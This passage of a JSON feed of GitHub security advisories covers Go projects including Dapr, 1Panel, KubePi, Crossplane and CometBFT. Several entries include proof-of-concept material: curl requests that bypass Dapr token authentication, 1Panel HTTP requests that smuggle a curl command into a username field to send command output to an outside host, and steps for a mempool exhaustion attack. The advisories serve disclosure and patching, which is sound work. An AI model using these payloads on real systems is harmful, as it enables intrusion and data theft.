PoC\nhttps://drive.google.com/file/d/1ksdawJ1vShRJyT3wAgpqVmz-Ls6hMA7M/preview\n\n### Impact\n- Leaking confidential information.\n- Can lead to password cracking attacks\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/KubeOperator/kubepi"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/1Panel-dev/KubePi/security/advisories/GHSA-87f6-8gr7-pc6h"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37916"}, {"type": "WEB", "url": "https://drive.google.com/file/d/1ksdawJ1vShRJyT3wAgpqVmz-Ls6hMA7M/preview"}, {"type": "PACKAGE", "url": "https://github.com/1Panel-dev/KubePi"}, {"type": "WEB", "url": "https://github.com/1Panel-dev/KubePi/releases/tag/v1.6.5"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-21T20:18:09Z", "nvd_published_at": "2023-07-21T21:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-59m6-82qm-vqgj", "modified": "2023-07-21T20:17:36Z", "published": "2023-07-21T20:17:36Z", "aliases": ["CVE-2023-37918"], "summary": "Dapr API token authentication bypass in HTTP endpoints", "details": "### Summary\n\n\nA vulnerability has been found in Dapr that allows bypassing [API token authentication](https://docs.dapr.io/operations/security/api-token/), which is used by the Dapr sidecar to authenticate calls coming from the application, with a well-crafted HTTP request.\n\n\nUsers who leverage API token authentication are encouraged to upgrade Dapr to 1.10.9 and 1.11.2.\n\n\n### Impact\n\n\nThis vulnerability impacts Dapr users who have configured API token authentication. An attacker could craft a request that is always allowed by the Dapr sidecar over HTTP, even if the `dapr-api-token` in the request is invalid or missing.\n\n\n### Patches\n\n\nThe issue has been fixed in Dapr 1.10.9 and 1.11.2.\n\n\n### Details\n\n\nWhen API token authentication is enabled, Dapr requires all calls from applications to include the `dapr-api-token` header, with a value matching what's included in the Dapr's configuration. In order to allow for healthchecks to work, the `/v1.0/healthz` and `/v1.0/healthz/outbound` HTTP APIs are excluded from the API token authentication check, and are always allowed.\n\n\nDapr <= 1.10.8 and <= 1.11.1 implemented the allowlisting of the healthcheck endpoints by permitting all requests whose URL contains `/healthz` to bypass the API token authentication check. The match applied anywhere in the URL, including the querystring.\n\n\nAs a consequence, attackers were able to bypass API token authentication by including `/healthz` anywhere in the URL, including as a querystring parameter. This allowed attackers to invoke any Dapr API using HTTP, including perform service invocation.\n\n\n### Proof of Concept\n\n\n```\n$ curl -v http://localhost:3500/v1.0/metadata\n* Trying ::1:3500...\n* Connected to localhost (::1) port 3500 (#0)\n> GET /v1.0/metadata HTTP/1.1\n> Host: localhost:3500\n> User-Agent: curl/7.74.0\n> Accept: */*\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 401 Unauthorized\n< Date: Mon, 17 Jul 2023 18:13:13 GMT\n< Content-Type: text/plain; charset=utf-8\n< Content-Length: 17\n< Traceparent: 00-00000000000000000000000000000000-0000000000000000-00\n<\n* Connection #0 to host localhost left intact\ninvalid api token\n\n\n$ curl -v http://localhost:3500/v1.0/metadata -H \"dapr-api-token: mytoken\"\n* Trying ::1:3500...\n* Connected to localhost (::1) port 3500 (#0)\n> GET /v1.0/metadata HTTP/1.1\n> Host: localhost:3500\n> User-Agent: curl/7.74.0\n> Accept: */*\n> dapr-api-token: mytoken\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 200 OK\n< Date: Mon, 17 Jul 2023 18:13:26 GMT\n< Content-Type: application/json\n< Content-Length: 119\n< Traceparent: 00-00000000000000000000000000000000-0000000000000000-00\n<\n* Connection #0 to host localhost left intact\n{\"id\":\"foo\",\"actors\":[],\"extended\":{\"daprRuntimeVersion\":\"v1.11.1\"},\"components\":[],\"httpEndpoints\":[],\"subscriptions\":[]}\n\n\n$ curl -v http://localhost:3500/v1.0/metadata?foo=/healthz\n* Trying ::1:3500...\n* Connected to localhost (::1) port 3500 (#0)\n> GET /v1.0/metadata?foo=/healthz HTTP/1.1\n> Host: localhost:3500\n> User-Agent: curl/7.74.0\n> Accept: */*\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 200 OK\n< Date: Mon, 17 Jul 2023 18:13:44 GMT\n< Content-Type: application/json\n< Content-Length: 119\n< Traceparent: 00-00000000000000000000000000000000-0000000000000000-00\n<\n* Connection #0 to host localhost left intact\n{\"id\":\"foo\",\"actors\":[],\"extended\":{\"daprRuntimeVersion\":\"v1.11.1\"},\"components\":[],\"httpEndpoints\":[],\"subscriptions\":[]}\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/dapr/dapr"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/dapr/dapr"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.10.9"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/dapr/dapr/security/advisories/GHSA-59m6-82qm-vqgj"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37918"}, {"type": "WEB", "url": "https://github.com/dapr/dapr/commit/83ca1abb11ffe34211db55dcd36d96b94252827a"}, {"type": "WEB", "url": "https://github.com/dapr/dapr/commit/99d6799c97b79397443c8c96737c9b893126a1ae"}, {"type": "WEB", "url": "https://docs.dapr.io/operations/security/api-token/"}, {"type": "PACKAGE", "url": "https://github.com/dapr/dapr"}], "database_specific": {"cwe_ids": ["CWE-287", "CWE-305"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-21T20:17:36Z", "nvd_published_at": "2023-07-21T21:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vjh7-5r6x-xh6g", "modified": "2023-10-24T23:02:08Z", "published": "2023-07-17T14:36:09Z", "aliases": ["CVE-2023-37265"], "summary": "CasaOS Gateway vulnerable to incorrect identification of source IP addresses", "details": "### Impact\n\nUnauthenticated attackers can execute arbitrary commands as `root` on CasaOS instances.\n\n### Patches\n\nThe problem was addressed by improving the detection of client IP addresses in 391dd7f. This patch is part of CasaOS 0.4.4.\n\n### Workarounds\n\nUsers should upgrade to CasaOS 0.4.4. If they can't, they should temporarily restrict access to CasaOS to untrusted users, for instance by not exposing it publicly. \n\n### References\n\n- 391dd7f\n- https://www.sonarsource.com/blog/security-vulnerabilities-in-casaos/", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/IceWhaleTech/CasaOS-Gateway"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/IceWhaleTech/CasaOS-Gateway/security/advisories/GHSA-vjh7-5r6x-xh6g"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37265"}, {"type": "WEB", "url": "https://github.com/IceWhaleTech/CasaOS-Gateway/commit/391dd7f0f239020c46bf057cfa25f82031fc15f7"}, {"type": "PACKAGE", "url": "https://github.com/IceWhaleTech/CasaOS-Gateway"}, {"type": "WEB", "url": "https://www.sonarsource.com/blog/security-vulnerabilities-in-casaos/"}], "database_specific": {"cwe_ids": ["CWE-306", "CWE-348"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-07-17T14:36:09Z", "nvd_published_at": "2023-07-17T21:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-68p4-95xf-7gx8", "modified": "2023-07-28T15:36:08Z", "published": "2023-07-28T15:36:08Z", "aliases": ["CVE-2023-37900"], "summary": "Denial of service from large image", "details": "### Impact\n\nAn high-privileged user could create a Package referencing an arbitrarily large image containing that Crossplane would then parse, possibly resulting in exhausting all the available memory and therefore in the container being OOMKilled.\n\nThe impact is low due to the high privileges required to be able to create the Package and the eventually consistency nature of controller.\n\n### Patches\n\nThe problem has been fixed in 1.11.5, 1.12.3 and 1.13.0, all the supported versions of Crossplane at the time of writing.\n\n### Workarounds\n\nOnly using images from trusted sources and keeping Package editing/creating privileges to administrators only, which should be both considered already best practices.\n\n### References\n\nSee `ADA-XP-23-16` in the Security Audit's [report](https://github.com/crossplane/crossplane/blob/ac8b24fe739c5d942ea885157148497f196c3dd3/security/ADA-security-audit-23.pdf).\n\n### Credits\n\nThis was reported as `ADA-XP-23-16` by @AdamKorcz and @DavidKorczynski from Ada Logic and facilitated by OSTIF as part of the Security Audit sponsored by CNCF.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/crossplane/crossplane"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.11.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/crossplane/crossplane"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "1.12.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/crossplane/crossplane/security/advisories/GHSA-68p4-95xf-7gx8"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37900"}, {"type": "PACKAGE", "url": "https://github.com/crossplane/crossplane"}, {"type": "WEB", "url": "https://github.com/crossplane/crossplane/blob/ac8b24fe739c5d942ea885157148497f196c3dd3/security/ADA-security-audit-23.pdf"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-07-28T15:36:08Z", "nvd_published_at": "2023-07-27T16:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hhvx-8755-4cvw", "modified": "2023-07-06T21:54:20Z", "published": "2023-07-06T19:24:11Z", "aliases": ["CVE-2023-1296"], "summary": "Hashicorp Nomad ACLs Cannot Deny Access to Workload\u2019s Own Variables", "details": "A vulnerability was identified in Nomad and Nomad Enterprise (\u201cNomad\u201d) such that a deny ACL capability could not be applied to a workload\u2019s own variables. If included, the Nomad ACL system will silently fail to block access. This vulnerability, CVE-2023-1296, was fixed in Nomad 1.4.6 and 1.5.1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.4.0"}, {"fixed": "1.4.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0"}, {"fixed": "1.5.1"}]}], "versions": ["1.5.0"]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1296"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-09-nomad-acls-can-not-deny-access-to-workloads-own-variables/51390"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/nomad"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-06T21:54:20Z", "nvd_published_at": "2023-03-14T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j2cr-jc39-wpx5", "modified": "2023-07-07T18:34:27Z", "published": "2023-07-07T18:34:27Z", "aliases": [], "summary": "Barberry Security Advisory - regarding x/auth periodic vesting accounts", "details": "### Impact\n\nIn `PeriodicVestingAccount`, defined in `x/auth`, an attacker can initialize a victim's account as a malicious vesting account, which allows deposits but does not allow withdrawals. When the user then deposits funds into their account, those funds are locked forever, and the user is not able to withdraw them.\n\n### Patches\n\n\\>= v0.46.13 for Cosmos SDK v0.46.x\n\\>= v0.47.3 for Cosmos SDK v0.47.x\n\nIf a network backported periodic vesting accounts to earlier versions of the SDK, those networks are affected too.\n\n### Workarounds\n\nThere is no workaround for this issue. Upgrade immediately.\n\n### References\n\n* Patched versions release notes: [v0.47.3](https://github.com/cosmos/cosmos-sdk/blob/cfc757dc5043fb2758c47c146d2912fd010c1a45/RELEASE_NOTES.md#cosmos-sdk-v0473-release-notes), [v0.46.13](https://github.com/cosmos/cosmos-sdk/blob/d4b7164de5d8391e6aa644d8ea84e07396dd9653/RELEASE_NOTES.md#cosmos-sdk-v04613-release-notes).\n* [Forum Post](https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825)", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cosmos/cosmos-sdk"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.46.0"}, {"fixed": "0.46.13"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.46.12"}}, {"package": {"ecosystem": "Go", "name": "github.com/cosmos/cosmos-sdk"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.47.0"}, {"fixed": "0.47.3"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.47.2"}}], "references": [{"type": "WEB", "url": "https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-j2cr-jc39-wpx5"}, {"type": "WEB", "url": "https://github.com/cosmos/cosmos-sdk/pull/16466"}, {"type": "WEB", "url": "https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825"}, {"type": "PACKAGE", "url": "https://github.com/cosmos/cosmos-sdk"}, {"type": "WEB", "url": "https://github.com/cosmos/cosmos-sdk/blob/cfc757dc5043fb2758c47c146d2912fd010c1a45/RELEASE_NOTES.md#cosmos-sdk-v0473-release-notes"}, {"type": "WEB", "url": "https://github.com/cosmos/cosmos-sdk/blob/d4b7164de5d8391e6aa644d8ea84e07396dd9653/RELEASE_NOTES.md#cosmos-sdk-v04613-release-notes"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-07T18:34:27Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-q2mx-gpjf-3h8x", "modified": "2023-07-05T21:38:07Z", "published": "2023-07-05T21:38:07Z", "aliases": ["CVE-2023-36457"], "summary": "1Panel vulnerable to command injection when adding container repositories", "details": "### Impact\n\nThe authenticated attacker can craft a malicious payload to achieve command injection when adding container repositories.\n\n1. Vulnerability analysis.\n\n```\nbackend\\app\\api\\v1\\image_repo.go#create\n```\n![image](https://user-images.githubusercontent.com/46734380/249118560-8c20dac6-d1be-49d2-b2b2-9a4df9b7cd04.png)\n\n```\nbackend\\app\\service\\image_repo.go#CheckConn\n```\n![image](https://user-images.githubusercontent.com/46734380/249118639-37b7a1e9-08a9-4316-8beb-39beefdceb33.png)\n\n2. vulnerability reproduction.\n\n```\nPOST /api/v1/containers/repo HTTP/1.1\nHost: 192.168.109.152:40982\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nX-CSRF-TOKEN: \nContent-Length: 446\nOrigin: http://192.168.109.152:40982\nConnection: close\nReferer: http://192.168.109.152:40982/containers/repo\nCookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e\n```\n\n```\n{\"id\":2,\"createdAt\":\"2023-04-13T19:57:43.633643247-07:00\",\"name\":\"asdasd\",\"downloadUrl\":\"127.0.0.1:8080\",\"protocol\":\"http\",\"username\":\"admin||curl http://192.168.109.1:12345/`ls`||\",\"auth\":true,\"status\":\"Failed\",\"message\":\"stderr: WARNING! Using --password via the CLI is insecure. Use --password-stdin.\\nError response from daemon: Get \\\"http://127.0.0.1:8080/v2/\\\": dial tcp 127.0.0.1:8080: connect: connection refused\\n\",\"password\":\"Passw0rd\"}\n```\n\n3. Using update can be triggered multiple times.\n\n```\nPOST /api/v1/containers/repo/update HTTP/1.1\nHost: 192.168.109.152:40982\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nX-CSRF-TOKEN: \nContent-Length: 447\nOrigin: http://192.168.109.152:40982\nConnection: close\nReferer: http://192.168.109.152:40982/containers/repo\nCookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e\n```\n\n```\n{\"id\":2,\"createdAt\":\"2023-04-13T19:57:43.633643247-07:00\",\"name\":\"asdasd\",\"downloadUrl\":\"127.0.0.1:8080\",\"protocol\":\"http\",\"username\":\"admin||curl http://192.168.109.1:12345/`pwd`||\",\"auth\":true,\"status\":\"Failed\",\"message\":\"stderr: WARNING! Using --password via the CLI is insecure. Use --password-stdin.\\nError response from daemon: Get \\\"http://127.0.0.1:8080/v2/\\\": dial tcp 127.0.0.1:8080: connect: connection refused\\n\",\"password\":\"Passw0rd\"}\n```\n\nAffected versions: <= 1.3.5\n\n### Patches\n\nThe vulnerability has been fixed in v1.3.6.\n\n### Workarounds\n\nIt is recommended to upgrade the version to v1.3.6.\n\n### References\n\nIf you have any questions or comments about this advisory:\n\nOpen an issue in https://github.com/1Panel-dev/1Panel\nEmail us at wanghe@fit2cloud.com\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/1Panel-dev/1Panel"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-q2mx-gpjf-3h8x"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-36457"}, {"type": "PACKAGE", "url": "https://github.com/1Panel-dev/1Panel"}, {"type": "WEB", "url": "https://github.com/1Panel-dev/1Panel/releases/tag/v1.3.6"}], "database_specific": {"cwe_ids": ["CWE-74", "CWE-77"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-05T21:38:07Z", "nvd_published_at": "2023-07-05T21:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f28g-86hc-823q", "modified": "2023-07-13T19:56:19Z", "published": "2023-07-13T19:56:19Z", "aliases": [], "summary": "Tokenizer vulnerable to client brute-force of token secrets", "details": "### Impact\n\nAuthorized clients, having an `inject_processor` secret, could brute-force the secret token value by abusing the `fmt` parameter to the `Proxy-Tokenizer` header.\n\n### Patches\n\nThis was fixed in https://github.com/superfly/tokenizer/pull/8 and further mitigated in https://github.com/superfly/tokenizer/pull/9.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/superfly/tokenizer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/superfly/tokenizer/security/advisories/GHSA-f28g-86hc-823q"}, {"type": "WEB", "url": "https://github.com/superfly/tokenizer/pull/8"}, {"type": "WEB", "url": "https://github.com/superfly/tokenizer/pull/9"}, {"type": "PACKAGE", "url": "https://github.com/superfly/tokenizer"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-13T19:56:19Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-757p-vx43-fp9r", "modified": "2023-07-21T20:18:00Z", "published": "2023-07-21T20:18:00Z", "aliases": ["CVE-2023-37917"], "summary": "KubePi Privilege Escalation vulnerability", "details": "### Summary\nA normal user has permission to create/update users, they can become admin by editing the `isadmin` value in the request\n\n\n### PoC\nChange the value of the `isadmin` field in the request to true:\nhttps://drive.google.com/file/d/1e8XJbIFIDXaFiL-dqn0a0b6u7o3CwqSG/preview\n\n### Impact\nElevate user privileges\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/KubeOperator/kubepi"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/1Panel-dev/KubePi/security/advisories/GHSA-757p-vx43-fp9r"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37917"}, {"type": "WEB", "url": "https://drive.google.com/file/d/1e8XJbIFIDXaFiL-dqn0a0b6u7o3CwqSG/preview"}, {"type": "PACKAGE", "url": "https://github.com/1Panel-dev/KubePi"}, {"type": "WEB", "url": "https://github.com/1Panel-dev/KubePi/releases/tag/v1.6.5"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-07-21T20:18:00Z", "nvd_published_at": "2023-07-21T21:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w24w-wp77-qffm", "modified": "2023-07-05T21:34:45Z", "published": "2023-07-05T21:34:45Z", "aliases": ["CVE-2023-34451"], "summary": "CometBFT may duplicate transactions in the mempool's data structures", "details": "### Impact\n\nThe mempool maintains two data structures to keep track of outstanding transactions: a list and a map.\nThese two data structures are supposed to be in sync all the time in the sense that the map tracks the index (if any) of the transaction in the list. \n\nUnfortunately, it is possible to have them out of sync. When this happens, the list may contain several copies of the same transaction.\nBecause the map tracks a single index, it is then no longer possible to remove all the copies of the transaction from the list.\nThis happens  even if the duplicated transaction is later committed in a block.\nThe only way to remove the transaction is by restarting the node.\n\nThese are the steps to cause the above duplication problem. Everything should happen within one height, that is no `FinalizeBlock` or `BeginBlock` ABCI calls should happen while these steps are reproduced:\n\n1. send transaction tx1 to the target full node via RPC\n2. send N more different transactions to the target full node, where N should be higher than the node's configured value for `cache_size` in `config.toml`\n3. send transaction tx1 again to the target full node\n\nOne of the copies of tx1 is now _stuck_ in the mempool's data structures. Effectively causing a memory leak, and having that node gossiping that transaction to its peers forever.\n\nThe above problem can be repeated on and on until a sizable number of transactions are stuck in the mempool, in order to try to bring down the target node.\n\nThis problem is present in releases: `v0.37.0`, and `v0.37.1`, as well as in `v0.34.28`, and all previous releases of the CometBFT repo. It will be fixed in releases `v0.34.29` and `v0.37.2`.\n\n### Patches\n\nThe PR containing the fix is [here](https://github.com/cometbft/cometbft/pull/890).\n\n\n### Workarounds\n\n* Increasing the value of `cache_size` in `config.toml` makes it very difficult to effectively attack a full node.\n* Not exposing the transaction submission RPC's would mitigate the probability of a successful attack, as the attacker would then have to create a modified (byzantine) full node to be able to perform the attack via p2p.\n\n### References\n\n* [PR](https://github.com/tendermint/tendermint/pull/2778) that introduced the map to track transactions in the mempool.\n* [PR](https://github.com/cometbft/cometbft/pull/890) containing the fix.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cometbft/cometbft"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.34.29"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cometbft/cometbft"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.37.0"}, {"fixed": "0.37.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cometbft/cometbft/security/advisories/GHSA-w24w-wp77-qffm"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-34451"}, {"type": "WEB", "url": "https://github.com/cometbft/cometbft/pull/890"}, {"type": "WEB", "url": "https://github.com/tendermint/tendermint/pull/2778"}, {"type": "PACKAGE", "url": "https://github.com/cometbft/cometbft"}], "database_specific": {"cwe_ids": ["CWE-401"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-05T21:34:45Z", "nvd_published_at": "2023-07-03T17:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mmx5-32m4-wxvx", "modified": "2023-07-25T13:52:20Z", "published": "2023-07-25T13:52:20Z", "aliases": ["CVE-2023-38496"], "summary": "Ineffective privileges drop when requesting container network", "details": "### Impact\n\nFix https://github.com/apptainer/apptainer/pull/1523 included in Apptainer 1.2.0-rc.2 has introduced an ineffective privilege drop when requesting container network setup, therefore subsequent functions are called with root privileges.  The attack surface is rather limited for users but an attacker could possibly craft a starter config to delete any directory on the host filesystems.  Only affects setuid installations of Apptainer.  \n\n### Patches\n\nThe security fix https://github.com/apptainer/apptainer/pull/1578 has been included in Apptainer 1.2.1\n\n### Workarounds\n\nThere is no known workaround outside of upgrading to Apptainer 1.2.1", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/apptainer/apptainer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.2.0"}, {"fixed": "1.2.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/apptainer/apptainer/security/advisories/GHSA-mmx5-32m4-wxvx"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-38496"}, {"type": "WEB", "url": "https://github.com/apptainer/apptainer/pull/1523"}, {"type": "WEB", "url": "https://github.com/apptainer/apptainer/pull/1578"}, {"type": "PACKAGE", "url": "https://github.com/apptainer/apptainer"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-25T13:52:20Z", "nvd_published_at": "2023-07-25T22:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pj4x-2xr5-w87m", "modified": "2023-07-28T15:33:38Z", "published": "2023-07-28T15:33:38Z", "aliases": ["CVE-2023-38495"], "summary": "Possible image tampering from missing image validation for Packages", "details": "### Impact\n\nCrossplanes image backend does not validate the byte contents of Crossplane packages. As such, Crossplane does not detect if an attacker has tampered with a Package.\n\n### Patches\n\nThe problem has been fixed in 1.11.5, 1.12.3 and 1.13.0, all the supported versions of Crossplane at the time of writing.\n\n### Workarounds\n\nOnly using images from trusted sources and keeping Package editing/creating privileges to administrators only, which should be both considered already best practices.\n\n### References\n\nSee `ADA-XP-23-11` in the Security Audit's [report](https://github.com/crossplane/crossplane/blob/ac8b24fe739c5d942ea885157148497f196c3dd3/security/ADA-security-audit-23.pdf).\n\n### Credits\n\nThis was reported as `ADA-XP-23-11` by @AdamKorcz and @DavidKorczynski from Ada Logic and facilitated by OSTIF as part of the Security Audit sponsored by CNCF.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/crossplane/crossplane"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.11.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/crossplane/crossplane"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "1.12.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/crossplane/crossplane/security/advisories/GHSA-pj4x-2xr5-w87m"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-38495"}, {"type": "PACKAGE", "url": "https://github.com/crossplane/crossplane"}, {"type": "WEB", "url": "https://github.com/crossplane/crossplane/blob/ac8b24fe739c5d942ea885157148497f196c3dd3/security/ADA-security-audit-23.pdf"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-28T15:33:38Z", "nvd_published_at": "2023-07-27T19:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qc2g-gmh6-95p4", "modified": "2023-07-05T22:46:57Z", "published": "2023-07-03T21:30:57Z", "aliases": ["CVE-2023-2727"], "summary": "kube-apiserver vulnerable to policy bypass", "details": "Users may be able to launch containers using images that are restricted by ImagePolicyWebhook when using ephemeral containers. Kubernetes clusters are only affected if the ImagePolicyWebhook admission plugin is used together with ephemeral containers.\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.27.0"}, {"fixed": "1.27.3"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.26.0"}, {"fixed": "1.26.6"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.25.0"}, {"fixed": "1.25.11"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.24.15"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-2727"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/118640"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/118356"}, {"type": "WEB", "url": 